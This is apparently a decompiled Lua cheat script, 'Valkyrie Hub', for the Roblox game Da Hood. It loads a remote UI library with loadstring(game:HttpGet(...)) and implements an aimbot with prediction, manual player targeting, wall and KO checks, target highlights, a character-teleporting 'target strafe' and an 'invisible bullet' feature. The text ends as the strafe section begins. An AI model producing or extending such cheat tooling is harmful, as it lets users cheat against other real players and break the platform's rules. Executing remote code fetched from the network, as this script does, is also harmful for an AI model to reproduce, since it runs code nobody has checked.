-- [[  Valkyrie Hub Da Hood  ]] --

local v1 = "https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/"
local v_u_2 = loadstring(game:HttpGet(v1 .. "Library.lua"))()
local v3 = loadstring(game:HttpGet(v1 .. "addons/ThemeManager.lua"))()
local v4 = loadstring(game:HttpGet(v1 .. "addons/SaveManager.lua"))()
local v_u_5 = game:GetService("RunService")
local v_u_6 = game:GetService("Players")
local v_u_7 = game:GetService("Workspace")
local v_u_8 = v_u_6.LocalPlayer
local v_u_9 = game:GetService("UserInputService")
local v10 = game:GetService("StarterGui")
local v_u_11 = game:GetService("ReplicatedStorage")
local v_u_12 = v_u_7.CurrentCamera
local v13 = v_u_2
local v_u_14 = v_u_2.CreateWindow(v13, {
	["Title"] = "Valkyrie Hub Beta | https://discord.gg/4qjrVA8V3u",
	["Center"] = true,
	["AutoShow"] = true
})
local v15 = game:GetService("UserInputService")
local function v_u_16()
	-- upvalues: (ref) v_u_14, (ref) v_u_9
	if v_u_14:IsVisible() then
		v_u_14:Hide()
		v_u_9.MouseIconEnabled = true
		v_u_9.MouseBehavior = Enum.MouseBehavior.Default
	else
		v_u_14:Show()
		v_u_9.MouseIconEnabled = true
		v_u_9.MouseBehavior = Enum.MouseBehavior.Default
	end
end
v15.InputBegan:Connect(function(p17, p18)
	-- upvalues: (ref) v_u_16
	if not p18 then
		if p17.KeyCode == Enum.KeyCode.RightShift then
			v_u_16()
		end
	end
end)
v_u_9.MouseIconEnabled = true 
v_u_9.MouseBehavior = Enum.MouseBehavior.Default
local v19 = v_u_14
local v20 = v_u_14.AddTab(v19, "Aimbot")
local v21 = v_u_14
local v22 = v_u_14.AddTab(v21, "Player")
local v23 = v_u_14
local v24 = v_u_14.AddTab(v23, "Visuals")
local v25 = v_u_14
local v26 = v_u_14.AddTab(v25, "Miscellaneous")
aimbotActive = false
aimPartName = "HumanoidRootPart"
aimBind = Enum.KeyCode.X
waitingForAimBind = false
targetPlayer = nil
aiming = false
wallCheckEnabled = false
koCheckEnabled = false
wallCheckType = "Once"
aimMethod = "Camera"
forceFieldCheck = false
AIM_RADIUS = 200
invisibleBulletEnabled = false
rainbowFOV = false
fovFilled = false
hue = 0
rangeLimitEnabled = false
aimRange = 1500
targetStrafeEnabled = false
targetStrafeBind = Enum.KeyCode.F1
waitingForTargetStrafeBind = false
targetStrafeSpeed = 10
targetStrafeHeight = 1
targetStrafeDistance = 10
allowTargetStrafeBindToggle = false
autoPredEnabled = false
autoPredMath = 200
circle = Drawing.new("Circle")
circle.Color = Color3.fromRGB(255, 255, 255)
circle.Thickness = 2
circle.NumSides = 80
circle.Radius = AIM_RADIUS
circle.Filled = false
circle.Transparency = 1
circle.Visible = false
fovColor = Color3.fromRGB(255, 255, 255)
circle.Color = fovColor
resolverType = "Recalculate"
autoLockEnabled = false
predictionX = 0
predictionY = 0
velocityResolverEnabled = false
resolverInterval = 0.1
lastResolveTime = 0
antiGroundShots = false
teamCheckEnabled = false
showTracer = false
showDot = false
rainbowDotTracerEnabled = false
highlightEnabled = false
rainbowHighlightEnabled = false
tracerLine = Drawing.new("Line")
tracerLine.Visible = false
tracerLine.Color = Color3.fromRGB(255, 255, 255)
tracerLine.Thickness = 2
tracerLine.ZIndex = 2
tracerOutline = Drawing.new("Line")
tracerOutline.Visible = false
tracerOutline.Color = Color3.fromRGB(0, 0, 0)
tracerOutline.Thickness = 4
tracerOutline.ZIndex = 1
dotCircle = Drawing.new("Circle")
dotCircle.Visible = false
dotCircle.Color = Color3.fromRGB(255, 255, 255)
dotCircle.Radius = 4
dotCircle.Filled = true
dotCircle.ZIndex = 2
dotOutline = Drawing.new("Circle")
dotOutline.Visible = false
dotOutline.Color = Color3.fromRGB(0, 0, 0)
dotOutline.Radius = 6
dotOutline.Filled = true
dotOutline.ZIndex = 1
highlights = {}
local v_u_27 = true
function isVisible(p28)
	-- upvalues: (ref) v_u_12, (ref) v_u_8, (ref) v_u_7
	local v29 = v_u_12.CFrame.Position
	local v30 = p28.Position - v29
	local v31 = RaycastParams.new()
	v31.FilterDescendantsInstances = { v_u_8.Character }
	v31.FilterType = Enum.RaycastFilterType.Blacklist
	local v32 = v_u_7:Raycast(v29, v30, v31)
	return not v32 and true or v32.Instance:IsDescendantOf(p28.Parent)
end
function isKO(p33)
	if not p33.Character then
		return true
	end
	local v34 = p33.Character:FindFirstChildOfClass("Humanoid")
	return (not v34 or v34.Health <= 2) and true or false
end
function hasForceField(p35)
	if p35.Character then
		return p35.Character:FindFirstChildOfClass("ForceField") ~= nil
	else
		return false
	end
end
function findTargetInRadius(p36)
	-- upvalues: (ref) v_u_9, (ref) v_u_8, (ref) v_u_6, (ref) v_u_12
	local v37 = v_u_9:GetMouseLocation()
	local v38 = nil
	local v39 = math.huge
	local v40 = v_u_8.Character
	if v40 then
		v40 = v_u_8.Character:FindFirstChild("HumanoidRootPart")
	end
	local v41 = v40 and v40.Position or nil
	local v42 = v_u_6
	local v43, v44, v45 = pairs(v42:GetPlayers())
	while true do
		local v46
		v45, v46 = v43(v44, v45)
		if v45 == nil then
			return v38
		end
		if v46 ~= v_u_8 and v46.Character and (v46.Character:FindFirstChild(p36) and (not teamCheckEnabled or (not v_u_8.Team or v46.Team ~= v_u_8.Team))) then
			if antiGroundShots then
				local v47 = v46.Character:FindFirstChildOfClass("Humanoid")
				if not v47 or v47.FloorMaterial == Enum.Material.Air then
					goto l25
				end
			else
				::l25::
				local v48 = v46.Character[p36]
				local v49, v50 = v_u_12:WorldToViewportPoint(v48.Position)
				if v50 then
					local v51 = (Vector2.new(v49.X, v49.Y) - Vector2.new(v37.X, v37.Y)).Magnitude
					if v51 <= AIM_RADIUS and v51 < v39 and (not (rangeLimitEnabled and v41) or ((v46.Character:FindFirstChild("HumanoidRootPart") or v48).Position - v41).Magnitude <= aimRange) then
						if wallCheckEnabled and wallCheckType == "Once" then
							if isVisible(v48) then
								v38 = v46
								v39 = v51
							end
						else
							v38 = v46
							v39 = v51
						end
					end
				end
			end
		end
	end
end
function velocityResolver(p52)
	if not p52.Character then
		return nil
	end
	local v53 = p52.Character:FindFirstChild("HumanoidRootPart")
	if not v53 then
		return nil
	end
	local v54 = tick()
	if v54 - lastResolveTime < resolverInterval then
		return v53.Position
	end
	lastResolveTime = v54
	local v55 = v53.Velocity
	local v56 = v53.Position
	if v55.Magnitude > 1 then
		v56 = v56 + v55.Unit * 1.5
	end
	return v56
end
function predictPosition(p57, p58)
	if not (p57.Character and p57.Character:FindFirstChild(p58)) then
		return nil
	end
	local v59 = p57.Character[p58]
	local v60 = p57.Character:FindFirstChild("HumanoidRootPart")
	if not v60 then
		return v59.Position
	end
	local v61 = velocityResolverEnabled and velocityResolver(p57)
	if v61 then
		return v61
	end
	if autoPredEnabled then
		local v62 = v60.Velocity
		return v59.Position + v62 / autoPredMath
	end
	if resolverType == "Recalculate" then
		return Vector3.new(v59.Position.X + predictionX, v59.Position.Y + predictionY, v59.Position.Z + predictionX)
	end
	if resolverType ~= "Move Direction" then
		return v59.Position
	end
	local v63 = v60.Velocity or Vector3.new()
	return v59.Position + v63 * 0.1
end
v_u_9.InputChanged:Connect(function(p64)
	if p64.UserInputType == Enum.UserInputType.MouseMovement then
		circle.Position = Vector2.new(p64.Position.X, p64.Position.Y + 50)
	end
end)
fixedInvisibleBulletPos = nil
local v_u_65 = false
local v_u_66 = nil
local v_u_67 = 0
local v_u_68 = 1.5
local function v_u_72()
	-- upvalues: (ref) v_u_8, (ref) v_u_67
	local v69 = v_u_8.Character
	if v69 then
		local v_u_70 = v69:FindFirstChildOfClass("Humanoid")
		local v_u_71 = v69:FindFirstChild("HumanoidRootPart")
		if v_u_70 then
			pcall(function()
				-- upvalues: (ref) v_u_70
				v_u_70.PlatformStand = false
			end)
		end
		if v_u_71 then
			pcall(function()
				-- upvalues: (ref) v_u_71
				v_u_71.Velocity = Vector3.new(0, 0, 0)
				v_u_71.RotVelocity = Vector3.new(0, 0, 0)
			end)
		end
	end
	v_u_67 = 0
end
local function v_u_101(p_u_73)
	-- upvalues: (ref) v_u_8, (ref) v_u_66, (ref) v_u_67, (ref) v_u_68
	if p_u_73 and p_u_73.Character and p_u_73.Character:FindFirstChild(aimPartName) then
		local v74 = p_u_73.Character[aimPartName]
		local v75 = v_u_8.Character
		if v75 then
			v75 = v_u_8.Character:FindFirstChild("HumanoidRootPart")
		end
		local v76 = v_u_8.Character
		if v76 then
			v76 = v_u_8.Character:FindFirstChildOfClass("Humanoid")
		end
		if v75 and v76 then
			if autoDisableEnabled and (function()
				-- upvalues: (ref) p_u_73
				if not (p_u_73 and p_u_73.Character) then
					return true
				end
				local v77 = p_u_73.Character
				local v_u_78 = v77:FindFirstChildOfClass("Humanoid")
				if v_u_78 then
					if v_u_78.Health and v_u_78.Health <= 0 then
						return true
					end
					local v79, v80 = pcall(function()
						-- upvalues: (ref) v_u_78
						return v_u_78:GetState()
					end)
					if v79 and v80 == Enum.HumanoidStateType.Dead then
						return true
					end
					local v81, v82, v83 = ipairs({
						"K.O",
						"KO",
						"Knocked",
						"Dead",
						"IsKO",
						"Downed",
						"KnockedOut"
					})
					while true do
						local v84
						v83, v84 = v81(v82, v83)
						if v83 == nil then
							break
						end
						if v_u_78.GetAttribute then
							local v85 = v_u_78:GetAttribute(v84)
							if v85 == true or v85 == 1 then
								return true
							end
						end
						local v86 = v77:FindFirstChild(v84)
						if v86 then
							if v86:IsA("BoolValue") and v86.Value == true then
								return true
							end
							if v86:IsA("NumberValue") and v86.Value > 0 then
								return true
							end
						end
						local v87 = v77:FindFirstChild("BodyEffects")
						if v87 then
							local v88 = v87:FindFirstChild(v84)
							if v88 then
								if v88:IsA("BoolValue") and v88.Value == true then
									return true
								end
								if v88:IsA("NumberValue") and v88.Value > 0 then
									return true
								end
							end
						end
					end
				end
				return false
			end)() then
				targetStrafeEnabled = false
			else
				if boostOnDamageEnabled then
					local v89 = v76.Health
					if v_u_66 and v89 < v_u_66 then
						v_u_67 = tick() + v_u_68
					end
					v_u_66 = v89
				end
				v76.PlatformStand = true
				local v90 = boostOnDamageEnabled and tick() < v_u_67 and 2 or 1
				local v91 = tick() * targetStrafeSpeed * v90
				local v92 = Vector3.new(math.sin(v91) * targetStrafeDistance, targetStrafeHeight, math.cos(v91) * targetStrafeDistance)
				local v93 = v74.Position
				if strafeMode == "Prediction" and adaptivePredictionEnabled then
					local v94 = v74.Velocity
					local v95 = Vector3.new(v94.X, 0, v94.Z)
					local v96 = Vector3.new()
					if v95.Magnitude > 0 then
						local v97 = math.min(v95.Magnitude * predictionAmount, maxPredictionDistance)
						v96 = v95.Unit * v97
					end
					v93 = v93 + v96
				end
				local v98 = v93 + v92
				local v99 = v93 - v75.Position
				local v100
				if v99.Magnitude <= 0 then
					v100 = Vector3.new(0, 0, -1)
				else
					v100 = Vector3.new(v99.X, 0, v99.Z).Unit
				end
				if strafeMode ~= "Smooth" then
					v75.CFrame = CFrame.new(v98, v98 + v100)
					v75.Velocity = Vector3.zero
					v75.RotVelocity = Vector3.zero
				else
					v75.CFrame = v75.CFrame:Lerp(CFrame.new(v98, v98 + v100), math.clamp(smoothLerpStrength or 0.15, 0.01, 1))
					v75.Velocity = v75.Velocity * 0.9
					v75.RotVelocity = v75.RotVelocity * 0.9
				end
			end
		else
			return
		end
	else
		return
	end
end
v_u_5.RenderStepped:Connect(function()
	-- upvalues: (ref) v_u_12, (ref) v_u_9, (ref) v_u_8, (ref) v_u_65, (ref) v_u_72, (ref) v_u_101
	if rainbowFOV then
		hue = (hue + 1) % 360
		circle.Color = Color3.fromHSV(hue / 360, 1, 1)
	else
		circle.Color = fovColor
	end
	if aimbotActive and autoLockEnabled and not (targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild(aimPartName)) then
		targetPlayer = findTargetInRadius(aimPartName)
		aiming = targetPlayer ~= nil
	end
	if aimbotActive and (aiming and (targetPlayer and targetPlayer.Character)) and targetPlayer.Character:FindFirstChild(aimPartName) then
		if koCheckEnabled and isKO(targetPlayer) then
			aiming = false
			targetPlayer = nil
			fixedInvisibleBulletPos = nil
		elseif forceFieldCheck and hasForceField(targetPlayer) then
			aiming = false
			targetPlayer = nil
			fixedInvisibleBulletPos = nil
		else
			local v102 = targetPlayer.Character[aimPartName]
			if wallCheckEnabled and (wallCheckType == "Repeat" and not isVisible(v102)) then
				aiming = false
				targetPlayer = nil
				fixedInvisibleBulletPos = nil
			else
				local v103 = v_u_12.CFrame.Position
				local v104 = predictPosition(targetPlayer, aimPartName)
				if v104 then
					local v105 = (v104 - v103).Unit
					if aimMethod ~= "Camera" then
						if aimMethod == "Mouse" then
							local v106 = v_u_12:WorldToViewportPoint(v104)
							local v107 = v_u_9
							local v108 = v_u_9
							mousemoverel(v106.X - v107:GetMouseLocation().X, v106.Y - v108:GetMouseLocation().Y)
						end
					else
						v_u_12.CFrame = CFrame.new(v103, v103 + v105)
					end
					if invisibleBulletEnabled then
						local v109 = targetPlayer.Character
						local v110 = v109:FindFirstChild("RightHand") or v109:FindFirstChild("Right Arm")
						local v111 = v_u_8.Character
						if v110 and (v111 and v111:FindFirstChild("HumanoidRootPart")) then
							if not fixedInvisibleBulletPos then
								fixedInvisibleBulletPos = v111.HumanoidRootPart.Position + Vector3.new(0, 0, 10)
							end
							v110.CFrame = CFrame.new(fixedInvisibleBulletPos)
						end
					else
						fixedInvisibleBulletPos = nil
					end
				end
			end
		end
	else
		fixedInvisibleBulletPos = nil
	end
	if targetPlayer and (targetPlayer.Character and (highlightEnabled or rainbowHighlightEnabled)) then
		if not highlights[targetPlayer] then
			local v112 = Instance.new("Highlight")
			v112.Parent = targetPlayer.Character
			v112.FillTransparency = 0.5
			v112.OutlineTransparency = 0
			v112.OutlineColor = Color3.fromRGB(0, 0, 0)
			v112.FillColor = Color3.fromRGB(255, 255, 255)
			highlights[targetPlayer] = v112
		end
		if rainbowHighlightEnabled then
			hue = (hue + 1) % 360
			highlights[targetPlayer].FillColor = Color3.fromHSV(hue / 360, 1, 1)
			highlights[targetPlayer].OutlineColor = Color3.fromRGB(0, 0, 0)
		else
			highlights[targetPlayer].FillColor = Color3.fromRGB(255, 255, 255)
			highlights[targetPlayer].OutlineColor = Color3.fromRGB(0, 0, 0)
		end
	end
	local v113, v114, v115 = pairs(highlights)
	while true do
		local v116
		v115, v116 = v113(v114, v115)
		if v115 == nil then
			break
		end
		if (v115 ~= targetPlayer or not (aimbotActive and aiming)) and (v116 and v116.Parent) then
			v116:Destroy()
			highlights[v115] = nil
		end
	end
	if aiming and (targetPlayer and targetPlayer.Character) and targetPlayer.Character:FindFirstChild(aimPartName) then
		local v117, v118 = v_u_12:WorldToViewportPoint(targetPlayer.Character[aimPartName].Position)
		if rainbowDotTracerEnabled then
			hue = (hue + 1) % 360
			tracerLine.Color = Color3.fromHSV(hue / 360, 1, 1)
			tracerOutline.Color = Color3.fromHSV(hue / 360, 1, 1)
			dotCircle.Color = Color3.fromHSV(hue / 360, 1, 1)
		else
			tracerLine.Color = Color3.fromRGB(255, 255, 255)
			tracerOutline.Color = Color3.fromRGB(0, 0, 0)
			dotCircle.Color = Color3.fromRGB(255, 255, 255)
		end
		if showTracer and v118 then
			local v119 = v_u_9:GetMouseLocation()
			tracerOutline.From = Vector2.new(v119.X, v119.Y)
			tracerOutline.To = Vector2.new(v117.X, v117.Y)
			tracerLine.From = Vector2.new(v119.X, v119.Y)
			tracerLine.To = Vector2.new(v117.X, v117.Y)
			tracerOutline.Visible = true
			tracerLine.Visible = true
		else
			tracerOutline.Visible = false
			tracerLine.Visible = false
		end
		if showDot and v118 then
			dotOutline.Position = Vector2.new(v117.X, v117.Y)
			dotCircle.Position = Vector2.new(v117.X, v117.Y)
			dotOutline.Visible = true
			dotCircle.Visible = true
		else
			dotOutline.Visible = false
			dotCircle.Visible = false
		end
	else
		tracerOutline.Visible = false
		tracerLine.Visible = false
		dotOutline.Visible = false
		dotCircle.Visible = false
	end
	if v_u_65 and not targetStrafeEnabled then
		v_u_72()
	end
	v_u_65 = targetStrafeEnabled
	if targetStrafeEnabled and (aiming and targetPlayer) then
		v_u_101(targetPlayer)
	else
		local v120 = v_u_8.Character
		if v120 then
			v120 = v_u_8.Character:FindFirstChildOfClass("Humanoid")
		end
		if v120 and not targetStrafeEnabled then
			v120.PlatformStand = false
		end
	end
end)
CameraAimbotGroup = v20:AddLeftGroupbox("Camera Aimbot")
CameraAimbotGroup:AddToggle("EnableAimbot", {
	["Text"] = "Enable",
	["Default"] = false
}):AddKeyPicker("AimBind", {
	["Default"] = "",
	["Mode"] = "Toggle",
	["Text"] = "Camera Aimbot",
	["NoUI"] = false,
	["SyncToggleState"] = false,
	["Callback"] = function(p121)
		-- upvalues: (ref) v_u_9
		if not v_u_9:GetFocusedTextBox() then
			aiming = p121
			if p121 then
				targetPlayer = findTargetInRadius(aimPartName)
			else
				targetPlayer = nil
			end
		end
	end
}):OnChanged(function(p122)
	-- upvalues: (ref) v_u_9, (ref) v_u_27, (ref) v_u_2
	if not v_u_9:GetFocusedTextBox() then
		aimbotActive = p122
		local v123 = circle
		local v124
		if p122 then
			v124 = v_u_27
		else
			v124 = p122
		end
		v123.Visible = v124
		if not p122 then
			aiming = false
			targetPlayer = nil
		end
		if aimbotNotifyEnabled then
			v_u_2:Notify("Aimbot - " .. (p122 and "Enabled" or "Disabled"), 3)
		end
	end
end)
CameraAimbotGroup:AddToggle("AutoLock", {
	["Text"] = "Auto Lock",
	["Default"] = false
}):OnChanged(function(p125)
	autoLockEnabled = p125
end)
CameraAimbotGroup:AddToggle("RangeLimitToggle", {
	["Text"] = "Distance Lock",
	["Default"] = false
}):OnChanged(function(p126)
	rangeLimitEnabled = p126
end)
CameraAimbotGroup:AddInput("AimRangeInput", {
	["Text"] = "Range (m/studs)",
	["Default"] = tostring(aimRange),
	["Numeric"] = true,
	["Finished"] = true,
	["Placeholder"] = "Enter value",
	["Callback"] = function(p127)
		local v128 = tonumber(p127)
		if v128 and 0 < v128 then
			aimRange = v128
		end
	end
})
CameraAimbotGroup:AddInput("PredictionX", {
	["Default"] = "0",
	["Numeric"] = true,
	["Finished"] = true,
	["Text"] = "Prediction X",
	["Placeholder"] = "Enter position X"
}):OnChanged(function(p129)
	predictionX = tonumber(p129) or 0
end)
CameraAimbotGroup:AddInput("PredictionY", {
	["Default"] = "0",
	["Numeric"] = true,
	["Finished"] = true,
	["Text"] = "Prediction Y",
	["Placeholder"] = "Enter position Y"
}):OnChanged(function(p130)
	predictionY = tonumber(p130) or 0
end)
CameraAimbotGroup:AddToggle("VelocityResolver", {
	["Text"] = "Velocity Resolver",
	["Default"] = false
}):OnChanged(function(p131)
	velocityResolverEnabled = p131
end)
CameraAimbotGroup:AddSlider("ResolverInterval", {
	["Text"] = "Resolver Interval",
	["Default"] = 0.1,
	["Min"] = 0,
	["Max"] = 0.5,
	["Rounding"] = 2,
	["Compact"] = false
}):OnChanged(function(p132)
	resolverInterval = p132
end)
CameraAimbotGroup:AddDropdown("ResolverType", {
	["Values"] = { "Recalculate", "Move Direction" },
	["Default"] = resolverType,
	["Multi"] = false,
	["Text"] = "Resolver Type"
}):OnChanged(function(p133)
	resolverType = p133
end)
CameraAimbotGroup:AddDropdown("AimPart", {
	["Values"] = {
		"Head",
		"HumanoidRootPart",
		"UpperTorso",
		"LowerTorso"
	},
	["Default"] = aimPartName,
	["Multi"] = false,
	["Text"] = "Hit Part"
}):OnChanged(function(p134)
	aimPartName = p134
end)
CameraAimbotGroup:AddToggle("AutoPred", {
	["Text"] = "Auto Pred",
	["Default"] = false
}):OnChanged(function(p135)
	autoPredEnabled = p135
end)
CameraAimbotGroup:AddSlider("AutoPredMath", {
	["Text"] = "Auto Pred Math",
	["Default"] = 200,
	["Min"] = 200,
	["Max"] = 300,
	["Rounding"] = 0,
	["Compact"] = false
}):OnChanged(function(p136)
	autoPredMath = p136
end)
local v137 = CameraAimbotGroup:AddInput("ManualTargetInput", {
	["Text"] = "Manual Target Aimbot",
	["Default"] = "",
	["Numeric"] = false,
	["Finished"] = true,
	["Placeholder"] = "Enter player name"
})
local v_u_138 = ""
v137:OnChanged(function(p139)
	-- upvalues: (ref) v_u_138, (ref) v_u_6, (ref) v_u_2
	v_u_138 = p139:lower()
	if aimbotActive and v_u_138 ~= "" then
		local v140 = v_u_6
		local v141, v142, v143 = pairs(v140:GetPlayers())
		local v144 = nil
		while true do
			local v145
			v143, v145 = v141(v142, v143)
			if v143 == nil then
				v145 = v144
				break
			end
			local v146 = v145.Name:lower()
			local v147 = v145.DisplayName:lower()
			if v146:find(v_u_138) or v147:find(v_u_138) then
				break
			end
		end
		if v145 then
			targetPlayer = v145
			aiming = true
			v_u_2:Notify("Manual target set: " .. v145.Name .. " (" .. v145.DisplayName .. ")", 3)
		else
			targetPlayer = nil
			aiming = false
			v_u_2:Notify("Manual target not found", 3)
		end
	elseif not aimbotActive then
		targetPlayer = nil
		aiming = false
	end
end)
CameraAimbotGroup:AddToggle("WallCheck", {
	["Text"] = "Wall Check",
	["Default"] = false
}):OnChanged(function(p148)
	wallCheckEnabled = p148
end)
CameraAimbotGroup:AddDropdown("WallCheckType", {
	["Values"] = { "Once", "Repeat" },
	["Default"] = wallCheckType,
	["Multi"] = false,
	["Text"] = "Wall Check Type"
}):OnChanged(function(p149)
	wallCheckType = p149
end)
CameraAimbotGroup:AddToggle("KOCheck", {
	["Text"] = "K.O Check",
	["Default"] = false
}):OnChanged(function(p150)
	koCheckEnabled = p150
end)
CameraAimbotGroup:AddToggle("TeamCheck", {
	["Text"] = "Team Check",
	["Default"] = false
}):OnChanged(function(p151)
	teamCheckEnabled = p151
end)
CameraAimbotGroup:AddToggle("ForceFieldCheck", {
	["Text"] = "ForceField Check",
	["Default"] = false
}):OnChanged(function(p152)
	forceFieldCheck = p152
end)
CameraAimbotGroup:AddToggle("AntiGroundShots", {
	["Text"] = "Anti Ground Shots",
	["Default"] = false
}):OnChanged(function(p153)
	antiGroundShots = p153
end)
CameraAimbotGroup:AddToggle("InvisibleBullet", {
	["Text"] = "Invisible Bullet",
	["Default"] = false,
	["Tooltip"] = "[Not supported REAL da hood] teleporting and anchor player character"
}):OnChanged(function(p154)
	invisibleBulletEnabled = p154
end)
TweenService = game:GetService("TweenService")
local v155 = v_u_8
playerGui = v_u_8.WaitForChild(v155, "PlayerGui")
local v_u_156 = false
local v_u_157 = nil
local v158 = Instance.new("ScreenGui")
v158.Name = "StatsTargetGui"
v158.Parent = playerGui
v158.ResetOnSpawn = false
local v_u_159 = Instance.new("Frame")
v_u_159.Size = UDim2.new(0, 320, 0, 100)
v_u_159.Position = UDim2.new(0.5, 0, 1, -150)
v_u_159.AnchorPoint = Vector2.new(0.5, 1)
v_u_159.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
v_u_159.BorderSizePixel = 0
v_u_159.Visible = false
v_u_159.BackgroundTransparency = 0.1
v_u_159.Parent = v158
local v160 = Instance.new("UICorner")
v160.CornerRadius = UDim.new(0, 6)
v160.Parent = v_u_159
local v_u_161 = Instance.new("ImageLabel")
v_u_161.Size = UDim2.new(0, 80, 0, 80)
v_u_161.Position = UDim2.new(0, 10, 0.5, -40)
v_u_161.BackgroundTransparency = 1
v_u_161.ScaleType = Enum.ScaleType.Fit
v_u_161.BorderSizePixel = 0
v_u_161.Parent = v_u_159
local v162 = Instance.new("UICorner")
v162.CornerRadius = UDim.new(1, 0)
v162.Parent = v_u_161
local v163 = Instance.new("Frame")
v163.Position = UDim2.new(0, 100, 0, 10)
v163.Size = UDim2.new(1, -110, 1, -20)
v163.BackgroundTransparency = 1
v163.Parent = v_u_159
local v_u_164 = Instance.new("TextLabel")
v_u_164.Size = UDim2.new(1, 0, 0, 20)
v_u_164.BackgroundTransparency = 1
v_u_164.Font = Enum.Font.GothamBold
v_u_164.TextSize = 19
v_u_164.TextColor3 = Color3.fromRGB(255, 255, 255)
v_u_164.TextXAlignment = Enum.TextXAlignment.Left
v_u_164.Text = "DisplayName"
v_u_164.Parent = v163
local v_u_165 = Instance.new("TextLabel")
v_u_165.Size = UDim2.new(1, 0, 0, 16)
v_u_165.Position = UDim2.new(0, 0, 0, 20)
v_u_165.BackgroundTransparency = 1
v_u_165.Font = Enum.Font.GothamSemibold
v_u_165.TextSize = 19
v_u_165.TextColor3 = Color3.fromRGB(170, 170, 170)
v_u_165.TextXAlignment = Enum.TextXAlignment.Left
v_u_165.Text = "@username"
v_u_165.Parent = v163
local v166 = Instance.new("Frame")
v166.Position = UDim2.new(0, 100, 1, -20)
v166.Size = UDim2.new(0, 200, 0, 8)
v166.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
v166.BorderSizePixel = 0
v166.Parent = v_u_159
local v_u_167 = Instance.new("Frame")
v_u_167.Size = UDim2.new(1, 0, 1, 0)
v_u_167.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
v_u_167.BorderSizePixel = 0
v_u_167.Parent = v166
local v_u_168 = {
	["displayName"] = "",
	["username"] = "",
	["health"] = -1,
	["userId"] = -1
}
local function v_u_169()
	-- upvalues: (ref) v_u_159
	if not v_u_159.Visible then
		v_u_159.Visible = true
		TweenService:Create(v_u_159, TweenInfo.new(0.25), {
			["BackgroundTransparency"] = 0.1
		}):Play()
	end
end
local function v_u_171()
	-- upvalues: (ref) v_u_159
	if v_u_159.Visible then
		local v170 = TweenService:Create(v_u_159, TweenInfo.new(0.25), {
			["BackgroundTransparency"] = 1
		})
		v170:Play()
		v170.Completed:Wait()
		v_u_159.Visible = false
	end
end
local function v_u_179(p172)
	-- upvalues: (ref) v_u_156, (ref) v_u_171, (ref) v_u_157, (ref) v_u_168, (ref) v_u_164, (ref) v_u_165, (ref) v_u_161, (ref) v_u_167, (ref) v_u_169
	if v_u_156 and (p172 and p172.Character) then
		local v173 = p172.Character:FindFirstChildOfClass("Humanoid")
		if v173 then
			local v174 = p172.DisplayName or "Unknown"
			local v175 = p172.Name or "Unknown"
			local v176 = math.floor(v173.Health)
			local v177 = p172.UserId or 0
			if v_u_157 ~= p172 or (v_u_168.displayName ~= v174 or (v_u_168.username ~= v175 or (v_u_168.health ~= v176 or v_u_168.userId ~= v177))) then
				v_u_157 = p172
				v_u_164.Text = v174
				v_u_165.Text = "[" .. v175 .. "]"
				v_u_161.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. v177 .. "&width=150&height=150&format=png"
				local v178 = math.clamp(v176 / v173.MaxHealth, 0, 1)
				v_u_167.Size = UDim2.new(v178, 0, 1, 0)
				v_u_169()
				v_u_168.displayName = v174
				v_u_168.username = v175
				v_u_168.health = v176
				v_u_168.userId = v177
			end
		else
			v_u_171()
		end
	else
		v_u_171()
		v_u_157 = nil
		return
	end
end
v_u_5.RenderStepped:Connect(function()
	-- upvalues: (ref) v_u_156, (ref) v_u_179, (ref) v_u_171
	if v_u_156 and (targetPlayer and targetPlayer.Character) then
		v_u_179(targetPlayer)
	else
		v_u_171()
	end
end)
CameraAimbotGroup:AddToggle("CheckTracer", {
	["Text"] = "Tracer Target",
	["Default"] = false
}):OnChanged(function(p180)
	showTracer = p180
end)
CameraAimbotGroup:AddToggle("CheckDot", {
	["Text"] = "Dot Target",
	["Default"] = false
}):OnChanged(function(p181)
	showDot = p181
end)
CameraAimbotGroup:AddToggle("RainbowDotTracer", {
	["Text"] = "Rainbow Dot & Tracer",
	["Default"] = false,
	["Callback"] = function(p182)
		rainbowDotTracerEnabled = p182
	end
})
CameraAimbotGroup:AddToggle("Highlight", {
	["Text"] = "Highlight",
	["Default"] = false,
	["Callback"] = function(p183)
		highlightEnabled = p183
		if p183 then
			rainbowHighlightEnabled = false
		end
	end
})
CameraAimbotGroup:AddToggle("RainbowHighlight", {
	["Text"] = "Rainbow Highlight",
	["Default"] = false,
	["Callback"] = function(p184)
		rainbowHighlightEnabled = p184
		if p184 then
			highlightEnabled = false
		end
	end
})
CameraAimbotGroup:AddToggle("StatsTarget", {
	["Text"] = "Stats Target v2",
	["Default"] = false
}):OnChanged(function(p185)
	-- upvalues: (ref) v_u_156, (ref) v_u_171
	v_u_156 = p185
	if not p185 then
		v_u_171()
	end
end)
CameraAimbotGroup:AddDropdown("AimMethod", {
	["Values"] = { "Camera", "Mouse" },
	["Default"] = aimMethod,
	["Multi"] = false,
	["Text"] = "Aim Method"
}):OnChanged(function(p186)
	aimMethod = p186
end)
CameraAimbotGroup:AddToggle("ShowFOV", {
	["Text"] = "Show FOV Circle",
	["Default"] = true,
	["Callback"] = function(p187)
		-- upvalues: (ref) v_u_27
		v_u_27 = p187
		local v188 = circle
		if p187 then
			p187 = aimbotActive
		end
		v188.Visible = p187
	end
}):AddColorPicker("FOVCircleColor", {
	["Default"] = fovColor,
	["Title"] = "FOV Circle Color",
	["Callback"] = function(p189)
		fovColor = p189
		if not rainbowFOV then
			circle.Color = p189
		end
	end
})
CameraAimbotGroup:AddToggle("RainbowFOV", {
	["Text"] = "Rainbow FOV",
	["Default"] = false
}):OnChanged(function(p190)
	rainbowFOV = p190
end)
CameraAimbotGroup:AddSlider("FOVSize", {
	["Text"] = "FOV Size",
	["Default"] = AIM_RADIUS,
	["Min"] = 50,
	["Max"] = 500,
	["Rounding"] = 0
}):OnChanged(function(p191)
	AIM_RADIUS = p191
	circle.Radius = p191
end)
CameraAimbotGroup:AddSlider("FOVTransparency", {
	["Text"] = "FOV Transparency",
	["Default"] = 0.7,
	["Min"] = 0,
	["Max"] = 1,
	["Rounding"] = 2
}):OnChanged(function(p192)
	circle.Transparency = p192
end)
TargetStrafeGroup = TargetStrafeGroup or v20:AddLeftGroupbox("Target Strafe")
strafeMode = strafeMode or "Static"
strafeModeOption = strafeModeOption or "Custom"
